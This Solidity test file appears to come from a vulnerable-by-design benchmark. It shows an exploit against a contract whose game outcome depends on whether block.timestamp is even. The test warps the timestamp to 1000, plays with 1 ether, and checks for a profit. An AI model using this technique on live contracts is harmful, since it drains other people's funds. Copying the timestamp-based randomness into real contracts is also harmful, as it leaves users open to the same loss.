// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/VulnTimestamp_1.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function warp(uint256 newTimestamp) external;
}

contract VulnTimestamp_1Test {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    VulnTimestamp_1 target;

    function setUp() public {
        target = new VulnTimestamp_1();
        vm.deal(address(target), 5 ether);
        vm.deal(address(this), 2 ether);
    }

    function testTimestampExploit() public {
        // Manipulate block timestamp to guarantee even parity
        vm.warp(1000); // 1000 % 2 == 0
        uint256 balBefore = address(this).balance;
        target.play{value: 1 ether}();
        uint256 balAfter = address(this).balance;
        require(balAfter > balBefore, "Timestamp exploit confirmed: block.timestamp parity exploited for profit");
    }

    receive() external payable {}
}
